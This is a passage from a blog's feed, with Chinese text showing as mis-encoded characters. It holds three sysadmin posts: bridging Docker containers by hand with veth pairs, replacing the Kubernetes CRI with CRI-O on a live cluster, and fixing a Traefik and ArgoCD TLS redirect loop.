preferred_lft forever</span><br><span class="line">33: eth0@if32: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP qlen 1000</span><br><span class="line">    link/ether 4e:1b:e1:22:8c:05 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.113.1.1/24 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></tbody></table></figure><p>ä¸¦ä¸”å¯ä»¥ç›´æ¥ ping åˆ°å¦å¤–ä¸€å€‹ Container</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # ping 10.113.1.2</span><br><span class="line">PING 10.113.1.2 (10.113.1.2): 56 data bytes</span><br><span class="line">64 bytes from 10.113.1.2: seq=0 ttl=64 time=0.062 ms</span><br><span class="line">64 bytes from 10.113.1.2: seq=1 ttl=64 time=0.155 ms</span><br></pre></td></tr></tbody></table></figure><p>å¦‚æ­¤ä¸€ä¾†å¯ä»¥ç”¨æ­¤æ¦‚å¿µï¼ˆæ­é… Bridgeï¼‰å®Œæˆä¸€äº›è¤‡é›œçš„ç¶²è·¯æƒ…å¢ƒ</p><h2 id="ä½¿ç”¨-Bridge"><a href="#ä½¿ç”¨-Bridge" class="headerlink" title="ä½¿ç”¨ Bridge"></a>ä½¿ç”¨ Bridge</h2><p>å¯¦éš›çš„ç¶²è·¯æƒ…æ³ä¸å¤ªå¯èƒ½éƒ½ç”¨ peer å»æ¥ï¼Œå°±é”æˆä¸€å€‹å€ç¶²å…§æœ‰å¤šå° Host é‚„æ˜¯éœ€è¦ä½¿ç”¨ Linux Bridgeã€‚å°±åƒ Docker é è¨­çš„ Bridge æ¨¡å¼èˆ¬ï¼Œé‚£æˆ‘å€‘å¯ä¸å¯ä»¥ä¸è¦é€é Dockerï¼Œè‡ªå·±å»ºç«‹ Bridge ä¾†é”æˆç¶²è·¯éš”é›¢ï¼Œç­”æ¡ˆæ˜¯å¯ä»¥ã€‚è‡ªå·±å»ºç«‹çš„è©±ä½ æœƒç™¼ç¾ Docker é™¤äº†æŠŠ Bridge å»ºç«‹å¥½ä»¥å¤–ï¼Œé‚„æœƒä½¿ç”¨ iptables æŠŠ Container ä¸­çš„æµé‡å¾ Host å¾€å¤–é€ï¼Œæˆ‘å€‘å¦‚æœä¸æƒ³è¦è®“å°åŒ…æœ‰æ©Ÿæœƒå¾ Host æµå‡ºï¼Œè‡ªå·±å»ºç«‹ Bridge æŠŠ veth peer ä¸€ç«¯æ¥ä¸Š Container ä¸€ç«¯æ¥ä¸Š Bridge ä¹Ÿæ˜¯ä¸€å€‹æ–¹æ³•ï¼</p><p>é¦–å…ˆï¼Œä¸€æ¨£å»ºç«‹å…©å€‹ Containers</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --network=none --name left alpine</span><br><span class="line">docker run -itd --network=none --name right alpine</span><br></pre></td></tr></tbody></table></figure><p>æ¥ä¸‹ä¾†æ‰‹å‹•å»ºç«‹ Linux Bridge</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brctl addbr br0</span><br><span class="line">ip link set dev br0 up</span><br></pre></td></tr></tbody></table></figure><p>å»ºç«‹ veth peer ä¸¦ä¸”å‘½åç‚º left-eth0, left-veth0<br>left-eth0 é€™ç«¯è¦æ”¾å…¥ Container çš„ Network Namespace ä¸­</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link add dev left-eth0 type veth peer name left-veth0</span><br><span class="line">ip link add dev right-eth0 type veth peer name right-veth0</span><br></pre></td></tr></tbody></table></figure><p>æ­¤æ™‚ä½ çš„ Host ä¸Šæœƒæœ‰å››å€‹æ–°å¢çš„ä»‹é¢</p><p>å–å¾— Containers çš„ Pid ç”¨ä¾†å°‡ peer åŠ å…¥è©² Pid çš„ Network Namespace</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left_pid=$(docker inspect left -f {{.State.Pid}})</span><br><span class="line">right_pid=$(docker inspect right -f {{.State.Pid}})</span><br><span class="line"></span><br><span class="line">ip link set left-eth0 netns ${left_pid} name eth0</span><br><span class="line">ip link set right-eth0 netns ${right_pid} name eth0</span><br></pre></td></tr></tbody></table></figure><p>åŠ å…¥æˆåŠŸå¾Œï¼Œåœ¨ Host ä¸Šå¯ä»¥çœ‹åˆ°ç¶²å¡å¾å‰›æ‰çš„å››å€‹è®Šæˆå…©å€‹</p><p>åœ¨ Container ä¸­ä¹Ÿæœƒçœ‹åˆ°è£¡é¢çš„ä»‹é¢å¤šäº† eth0</p><p>å°‡ veth peer å¦ä¸€ç«¯æ¥ä¸Šæˆ‘å€‘è‡ªè¡Œæ–°å¢çš„ Linux Bridgeï¼Œä¸¦ä¸”å°‡ç¶²å¡å•Ÿå‹•</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">brctl addif br0 left-veth0</span><br><span class="line">brctl addif br0 right-veth0</span><br><span class="line"></span><br><span class="line">ip link set dev left-veth0 up</span><br><span class="line">ip link set dev right-veth0 up</span><br></pre></td></tr></tbody></table></figure><p>æ¥ä¸‹ä¾†æˆ‘å€‘è¦å¾ Host ä¸Šè¨­å®š Container ä¸­çš„ä»‹é¢ï¼Œå› ç‚ºè©²å·²ç¶“åœ¨ä¸åŒç¶²è·¯ç©ºé–“ï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦è‡ªè¡Œ mappingï¼Œä¸ç„¶ iproute2 æœƒæ‰¾ä¸åˆ°è©²ç¶²è·¯ä»‹é¢</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/$left_pid/ns/net /var/run/netns/$left_pid</span><br><span class="line">ln -s /proc/$right_pid/ns/net /var/run/netns/$right_pid</span><br><span class="line">ip netns show</span><br></pre></td></tr></tbody></table></figure><p>é‚£ç‚ºä½•ä¸åœ¨ Container ä¸­åšè¨­å®šï¼Ÿå› ç‚ºé€™æ¨£å­éœ€è¦ Container å…·å‚™ç‰¹å®šçš„ Linux Capability</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip netns exec $left_pid ip addr add 10.113.1.1/24 dev eth0</span><br><span class="line">ip netns exec $left_pid ip link set eth0 up</span><br><span class="line">ip netns exec $right_pid ip addr add 10.113.1.2/24 dev eth0</span><br><span class="line">ip netns exec $right_pid ip link set eth0 up</span><br></pre></td></tr></tbody></table></figure><p>æ¥ä¸‹ä¾†å°±å¯ä»¥ä½¿ç”¨ ping ä¾†æª¢æŸ¥æ˜¯å¦ Containers ä¹‹é–“ç¶²è·¯æœ‰é€š</p><p>docker exec left ping 10.113.1.2 -c3<br>docker exec right ping 10.113.1.1 -c3</p><p>å¦‚æœæ²’é€šçš„è©±ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ iptables çš„ FORWARD chain æ˜¯ä¸æ˜¯è¢« DROP æ‰äº†ï¼Œæ˜¯çš„è©±å…ˆæŠŠ Policy æ”¹æˆ ACCEPT å³å¯</p><p>é€šå¸¸æˆ‘å€‘ä½¿ç”¨ Docker å»å»ºç«‹ Bridge çš„è©±ï¼Œé€™äº› iptables è¦å‰‡éƒ½æ˜¯ Docker å¹«æˆ‘å€‘è™•ç†çš„ï¼Œæ‰€ä»¥æˆ‘å€‘ç¾åœ¨éœ€è¦è‡ªè¡Œä¿®æ”¹ iptablesã€‚</p><h2 id="é¡Œå¤–"><a href="#é¡Œå¤–" class="headerlink" title="é¡Œå¤–"></a>é¡Œå¤–</h2><p>Docker æä¾›çš„ç¶²è·¯é¸é …ä¸å¤šï¼Œç•¢ç«Ÿä»–ä¸»è¦æ˜¯ç”¨ä¾†åšè³‡æºéš”é›¢ã€‚é™¤äº†ä»¥ä¸Šå•é¡Œæ²’è¾¦æ³•ç”¨å…§å»ºçš„ç¶²è·¯é¸é …å¤–ï¼Œä¸€å€‹ Container å‡è¨­æœ‰å¤šå€‹ç¶²è·¯ç’°å¢ƒï¼Œä¹Ÿæ²’è¾¦æ³•åœ¨ Container å•Ÿå‹•æ™‚æŒ‡å®šé è¨­è·¯ç”±ï¼Œåªèƒ½ç”¨æ¯”è¼ƒæ‹å½æŠ¹è§’çš„æ–¹å¼åœ¨ entrypoint æˆ–æ˜¯ commands åšã€‚</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="docker" scheme="https://blog.yiyu0x.org/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>ä¸åœæ©Ÿæ›¿æ› Kubernetes CRI</title>
    <link href="https://blog.yiyu0x.org/2021/04/17/"/>
    <id>https://blog.yiyu0x.org/2021/04/17/</id>
    <published>2021-04-17T06:34:42.000Z</published>
    <updated>2025-04-12T20:59:43.591Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å•é¡Œ"><a href="#å•é¡Œ" class="headerlink" title="å•é¡Œ"></a>å•é¡Œ</h2><p>ä»Šå¤©å˜—è©¦å°‡ CRI å¾é è¨­çš„ dockershim æ›¿æ›è‡³ CRI-Oï¼Œç¶²è·¯ä¸Šçš„æ•™å­¸éƒ½æ˜¯æ•™ä½ æ›´æ›å®Œç•¢ä¹‹å¾Œä½¿ç”¨ kubeadm é‡æ–°èµ·ä¸€å€‹ Clusterã€‚ä½†æˆ‘çš„æƒ…å¢ƒéœ€è¦å°ç¾æœ‰çš„ Cluster åšæ›¿æ›ï¼Œæ–¼æ˜¯è‡ªå·±ç ”ç©¶äº†ä¸€ä¸‹å¦‚ä½•ä¸åœæ©Ÿæ›¿æ› CRIã€‚</p><h2 id="æ›¿æ›-CRI"><a href="#æ›¿æ›-CRI" class="headerlink" title="æ›¿æ› CRI"></a>æ›¿æ› CRI</h2><p>é¦–å…ˆå°‡ä½ éœ€è¦æ›¿æ›çš„ç¯€é»å…ˆè¨­ drain</p><p><code>kubectl drain worker-node-1 --ignore-daemonsets</code></p><p>ä¹‹å¾Œé€²å…¥ç¯€é»ï¼Œå°‡åŸæœ¬çš„ CRI dockershim é—œé–‰</p><p><code>systemctl stop docker</code></p><p>æˆ‘æ‰“ç®—æ›¿æ›æˆ CRI-Oï¼Œæ‰€ä»¥è«‹å…ˆç¢ºå®šä½ æƒ³è¦æ›¿æ›çš„ CRI å·²ç¶“å®‰è£å®Œç•¢ï¼Œä¸¦ä¸”å·²ç¶“å•Ÿå‹•ï¼š</p><p><code>systemctl status crio</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â— crio.service - Container Runtime Interface for OCI (CRI-O)</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/crio.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since å…­ 2021-04-17 02:25:09 EDT; 15min ago</span><br><span class="line">     Docs: https://github.com/cri-o/cri-o</span><br><span class="line"> Main PID: 22001 (crio)</span><br><span class="line">    Tasks: 21</span><br><span class="line">   Memory: 1.1G</span><br><span class="line">   CGroup: /system.slice/crio.service</span><br><span class="line">           â””â”€22001 /usr/bin/crio</span><br></pre></td></tr></tbody></table></figure><p>æ¥è‘—ç…§è‘—ç¶²è·¯ä¸Šçš„æ•™å­¸ï¼Œä¿®æ”¹ <code>/usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf</code></p><p>ä¸¦ä¸”å¢åŠ </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Environment="KUBELET_EXTRA_ARGS=--feature-gates='AllAlpha=false,RunAsGroup=true' --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint='unix:///var/run/crio/crio.sock' --runtime-request-timeout=5m"</span><br></pre></td></tr></tbody></table></figure><p>ä½†æ˜¯é‡å•Ÿ kubelet ä¹‹å¾Œæœƒç™¼ç¾æ¯«ç„¡ä½œç”¨ï¼ˆç”¨ <code>systemctl status kubelet</code> å¯ä»¥æª¢æŸ¥å•Ÿå‹•åƒæ•¸ï¼‰</p><p>ç‚ºä½•æœƒæ¯«ç„¡ä½œç”¨ï¼Œæ˜¯å› ç‚ºè©²æª”æ¡ˆæ˜¯ kubeadm å•Ÿå‹•æ™‚è®€å–çš„ï¼Œä½†æ˜¯æˆ‘æ‰“ç®—ä¸åœæ©Ÿæ‰€ä»¥ä¸è€ƒæ…®ä½¿ç”¨ kubeadm é‡å•Ÿï¼Œæˆ‘æ‰“ç®—åœ¨æ¯ä¸€å€‹ç¯€é»ä¸Šé‡å•Ÿ kubelet ä¾†æ›¿æ›ï¼Œæ‰€ä»¥éœ€è¦é‡å° kubelet ä¾†è¨­å®šå•Ÿå‹•åƒæ•¸ã€‚</p><p>æ–¼æ˜¯æˆ‘åœ¨è©²æª”æ¡ˆæ‰¾åˆ°äº† EnvironmentFile åƒæ•¸ï¼Œä¸¦ä¸”å€¼ç‚º <code>/etc/sysconfig/kubelet</code></p><p>æ–¼æ˜¯æˆ‘åœ¨ <code>/etc/sysconfig/kubelet</code> åŠ å…¥äº†</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KUBELET_EXTRA_ARGS=--feature-gates='AllAlpha=false,RunAsGroup=true' --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint='unix:///var/run/crio/crio.sock' --runtime-request-timeout=5m</span><br></pre></td></tr></tbody></table></figure><p>ä¹‹å¾Œé‡å•Ÿ kubelet</p><p><code>systemctl daemon-reload</code><br><code>systemctl restart kubelet</code></p><p>å¯ä»¥çœ‹åˆ°å•Ÿå‹•åƒæ•¸å·²ç¶“åƒé€²å»äº†</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â— kubelet.service - kubelet: The Kubernetes Node Agent</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; vendor preset: disabled)</span><br><span class="line">  Drop-In: /usr/lib/systemd/system/kubelet.service.d</span><br><span class="line">           â””â”€10-kubeadm.conf</span><br><span class="line">   Active: active (running) since å…­ 2021-04-17 02:25:09 EDT; 22min ago</span><br><span class="line">     Docs: https://kubernetes.io/docs/</span><br><span class="line"> Main PID: 22114 (kubelet)</span><br><span class="line">    Tasks: 16</span><br><span class="line">   Memory: 51.2M</span><br><span class="line">   CGroup: /system.slice/kubelet.service</span><br><span class="line">           â””â”€22114 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --network-plugin=cni --pod-infra-container-image=k8s.gcr.io/pause:3.2 --feature-gates=AllAlpha=false,RunAsGroup=true --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint=unix:///var/run/crio/crio.sock --runtime-request-timeout=5m</span><br></pre></td></tr></tbody></table></figure><p>ä½¿ç”¨</p><p><code>kubectl get node -o wide</code></p><p>ä¹Ÿå¯ä»¥ç™¼ç¾ CRI å·²ç¶“æ›´æ›</p><p>é‡æ–°è®“è©²ç¯€é»å¯ä»¥è¢«ä½¿ç”¨</p><p><code>kubectl uncordon worker-node-1</code></p><h2 id="æ³¨æ„äº‹é …"><a href="#æ³¨æ„äº‹é …" class="headerlink" title="æ³¨æ„äº‹é …"></a>æ³¨æ„äº‹é …</h2><ol><li><p>æ›¿æ› Control Plane ç¯€é»æ™‚è«‹ä¸€å®šè¦æŠŠåŸæœ¬çš„ CRI é—œé–‰ï¼Œå¦å‰‡ç³»çµ±å…ƒä»¶æœƒä½”ç”¨ä½ ç¯€é»ä¸Šçš„ Portï¼Œå°è‡´ä½¿ç”¨æ–°çš„ CRI ç„¡æ³•é †åˆ©å°‡ç³»çµ±å…ƒä»¶è·‘èµ·ä¾†ï¼</p></li><li><p>éƒ¨ç½²å®Œç•¢å¾Œ coredns å ±éŒ¯</p></li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">container_linux.go:349: starting container process caused "error adding seccomp rule for syscall socket: requested action matches default action of filter"               â”‚   Warning  FailedCreatePodSandBox  36m  kubelet, worker-node-2  Failed to create pod sandbox: rpc error: code = Unknown desc = container create failed: time="2021-04-17</span><br><span class="line">â”‚ T02:23:10-04:00" level=error msg="container_linux.go:349: starting container process caused \"error adding seccomp rule for syscall socket: requested action matches def  â”‚ ault action of filter\""</span><br></pre></td></tr></tbody></table></figure><p>çœ‹åˆ°é€™ç¯‡ï¼š<a href="https://github.com/cri-o/cri-o/issues/4491" target="_blank" rel="noopener">https://github.com/cri-o/cri-o/issues/4491</a></p><p>å°‡ runc å‡ç´šç‚º 1.0.0-rc93 å¾Œè§£æ±º</p><p><code>yum update runc -y</code></p><ol start="3"><li>éƒ¨ç½²å®Œç•¢å¾Œç™¼ç¾ busybox ä¸èƒ½ä½¿ç”¨ pingï¼ˆæ¬Šé™ä¸è¶³ï¼‰ï¼Œå¢åŠ  CRI-O çš„ capabilitiesï¼Œé è¨­åªæœ‰</li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">default_capabilities = [</span><br><span class="line">  "CHOWN",</span><br><span class="line">  "DAC_OVERRIDE",</span><br><span class="line">  "FSETID",</span><br><span class="line">  "FOWNER",</span><br><span class="line">  "SETGID",</span><br><span class="line">  "SETUID",</span><br><span class="line">  "SETPCAP",</span><br><span class="line">  "NET_BIND_SERVICE",</span><br><span class="line">  "KILL",</span><br><span class="line">]</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€æ¬¡ Traefik èˆ‡ TLS çš„è¸©é›·ç¶“é©—</title>
    <link href="https://blog.yiyu0x.org/2021/03/26/"/>
    <id>https://blog.yiyu0x.org/2021/03/26/</id>
    <published>2021-03-26T10:07:37.000Z</published>
    <updated>2025-04-12T20:59:43.591Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å•é¡Œé»"><a href="#å•é¡Œé»" class="headerlink" title="å•é¡Œé»"></a>å•é¡Œé»</h2><p>éƒ¨ç½² ArgoCD é€² Kubernetes å®Œç•¢æ™‚ï¼Œç™¼ç¾ ArgoCD é–‹äº† 80, 443 å…©å€‹ Service Portï¼Œå°æ‡‰åˆ°çš„ Container Port éƒ½åŒæ¨£æ˜¯ 8080ã€‚å¦‚æœä½ ç”¨ http è«‹æ±‚ ArgoCD çš„ Web æ™‚ï¼Œä»–æœƒè«‹ä½ è·³è½‰åˆ° httpsã€‚</p><p>ç‚ºäº†è®“å¤–éƒ¨çš„ User å¯ä»¥ä½¿ç”¨ ArgoCDï¼Œæˆ‘è¨­å®šäº† Traefik çš„ IngressRoute ä¾†å­˜å–è©²è³‡æºï¼Œä½†æ˜¯å»ä¸€ç›´æ²’æœ‰æˆåŠŸã€‚</p><p>æˆ‘çš„æ¶æ§‹ç’°å¢ƒç‚º</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                    |</span><br><span class="line">Nginx-proxyï¼ˆå¤–éƒ¨ï¼‰  | -> K8s-worker(Traefik/Ingress) -> ArgoCD-server(service)</span><br><span class="line">                    |</span><br></pre></td></tr></tbody></table></figure><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><h3 id="IngressRoute"><a href="#IngressRoute" class="headerlink" title="IngressRoute"></a>IngressRoute</h3><p>ç‚ºäº†ç°¡åŒ–ç’°å¢ƒï¼ˆdebugï¼‰ï¼Œæ–¼æ˜¯æˆ‘å¾ Cluster å…§éƒ¨å»æ‰“ Ingressï¼Œç™¼ç¾å›æ‡‰ä¸€ç›´éƒ½æ˜¯ 404ï¼Œä½†æ˜¯æˆ‘æŠŠ Service åš port forward åˆ° local ç«¯ï¼Œå»å¯ä»¥æ­£å¸¸é‹ä½œï¼Œæ‰€ä»¥æ¨æ¸¬æ˜¯ ArgoCD çš„ IngressRoute è¦å‰‡æœ‰èª¤ï¼Œè€Œæˆ‘ä½¿ç”¨çš„è¦å‰‡æ˜¯ArgoCD å®˜æ–¹æ–‡ä»¶æåˆ°çš„ï¼š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">traefik.containo.us/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">IngressRoute</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">argocd</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  entryPoints:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">websecure</span></span><br><span class="line"><span class="attr">  routes:</span></span><br><span class="line"><span class="attr">    - kind:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">      match:</span> <span class="string">Host(`argocd.example.com`)</span></span><br><span class="line"><span class="attr">      priority:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">      services:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">          port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">    - kind:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">      match:</span> <span class="string">Host(`argocd.example.com`)</span> <span class="string">&&</span> <span class="string">Headers(`Content-Type`,</span> <span class="string">`application/grpc`)</span></span><br><span class="line"><span class="attr">      priority:</span> <span class="number">11</span></span><br><span class="line"><span class="attr">      services:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">          port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">          scheme:</span> <span class="string">h2c</span></span><br><span class="line"><span class="attr">  tls:</span></span><br><span class="line"><span class="attr">    certResolver:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">    options:</span> <span class="string">{}</span></span><br></pre></td></tr></tbody></table></figure><p>æ–¼æ˜¯æˆ‘ä½¿ç”¨ï¼ˆå¾ Cluster ç¯€é»ä¸Šç›´æ¥æ‰“ Ingressï¼‰</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl https://argocd.example.com -k</span><br><span class="line">> href="https://argocd.example.com/">Temporary Redirect</a>.</span><br><span class="line"></span><br><span class="line">curl https://argocd.example.com -k -L</span><br><span class="line">> curl: (47) Maximum (50) redirects followed</span><br></pre></td></tr></tbody></table></figure><p>æˆ‘æŸ¥äº† Traefik çš„å®˜æ–¹æ–‡ä»¶ç™¼ç¾</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">There are 3 ways to configure the backend protocol for communication between Traefik and your pods:</span><br><span class="line"></span><br><span class="line">    Setting the scheme explicitly (http/https/h2c)</span><br><span class="line">    Configuring the name of the kubernetes service port to start with https (https)</span><br><span class="line">    Setting the kubernetes service port to use port 443 (https)</span><br><span class="line"></span><br><span class="line">If you do not configure the above, Traefik will assume an http connection.</span><br></pre></td></tr></tbody></table></figure><p>ç°¡å–®ä¾†èªªï¼ŒTreafik ä¸¦ä¸æœƒå› ç‚ºä½ ä½¿ç”¨ https å»æ‰“ Ingressï¼Œå°±ä½¿ç”¨è©²å”å®šå¹«ä½ æ‰“å¾Œç«¯çš„ Pod (or Service)ï¼Œå¦‚æœä½ æŒ‡å®š Service ç‚º 443 Port é‚£éº¼ä»–å°±å¹«ä½ ç”¨ https å»è·Ÿå¾Œç«¯çš„ Pod å»ºç«‹é€£ç·šï¼Œè€Œé è¨­éƒ½æ˜¯èµ° http é€£ç·šã€‚</p><p>æ‰€ä»¥æ‡‰è©²å°‡ yaml æª”æ¡ˆæ”¹ç‚º</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">routes:</span></span><br><span class="line"><span class="attr">    - kind:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">    match:</span> <span class="string">Host(`argocd.example.com`)</span></span><br><span class="line"><span class="attr">    priority:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">    services:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">        port:</span> <span class="number">443</span></span><br></pre></td></tr></tbody></table></figure><p>æˆ–æ˜¯æŒ‡å®š protocol</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">routes:</span></span><br><span class="line"><span class="attr">    - kind:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">    match:</span> <span class="string">Host(`argocd.tcs-proxy.cscc`)</span></span><br><span class="line"><span class="attr">    priority:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">    services:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">        port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">        scheme:</span> <span class="string">https</span></span><br></pre></td></tr></tbody></table></figure><p>ä¾†å¼·åˆ¶ IngressRoute èˆ‡ ArgoCD ä½¿ç”¨ https å»ºç«‹é€£ç·šã€‚</p><p>å¦å¤–ï¼Œå› ç‚º ArgoCD çš„æ†‘è­‰æ˜¯è‡ªè¡Œç°½ç™¼çš„ï¼ŒTraefik ä¸¦èªä¸å¾—è©²å–®ä½ï¼Œæ‰€ä»¥ Traefik å¿…é ˆè¨­å®š <code>--serversTransport.insecureSkipVerify=true</code> ä¾†å¿½ç•¥æ†‘è­‰çš„é©—è­‰</p><h3 id="Reverse-Proxy-to-Cluster"><a href="#Reverse-Proxy-to-Cluster" class="headerlink" title="Reverse Proxy to Cluster"></a>Reverse Proxy to Cluster</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                    |</span><br><span class="line">Nginx-proxyï¼ˆå¤–éƒ¨ï¼‰  |  -> K8s-worker(Traefik/Ingress) -> ArgoCD-server(service)</span><br><span class="line">                    |</span><br></pre></td></tr></tbody></table></figure><p>æˆ‘çš„æƒ…å¢ƒä¸­ï¼ŒCluster å¤–éƒ¨é‚„æœ‰ä¸€å° Load Balancer æœƒå°‡æµé‡å°è‡´ Cluster çš„ Worker Nodesï¼Œä½†æ˜¯ Traefik å·²ç¶“æœ‰æ†‘è­‰äº†ï¼Œå¾Œç«¯çš„ ArgoCD 